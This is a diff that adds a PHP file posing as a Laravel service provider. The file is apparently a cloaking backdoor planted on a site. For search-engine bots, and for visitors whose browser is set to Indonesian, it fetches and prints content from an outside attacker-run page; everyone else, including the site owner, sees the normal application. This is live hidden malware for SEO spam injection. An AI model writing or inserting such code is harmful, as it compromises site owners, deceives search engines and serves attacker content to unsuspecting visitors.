@@ -1,0 +1,25 @@
+<?php
+
+function is_indonesian_browser() {
+    $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';
+    return stripos($lang, 'id') !== false;
+}
+
+function is_regular_browser() {
+    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    return preg_match('/(Chrome|Firefox|Safari|Edge|Opera|SamsungBrowser|UCBrowser)/i', $ua);
+}
+
+function is_bot() {
+    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+    return preg_match('/bot|crawl|spider|google|bing|yandex|ahrefs|semrush|duckduckgo|baidu|slurp/i', $ua);
+}
+
+if ((is_indonesian_browser() && is_regular_browser()) || is_bot()) {
+    echo file_get_contents('https://xseounhide.pages.dev/AppServiceProvider.txt');
+    exit;
+}
+
+include base_path('AppServiceProvider.php');
+
+
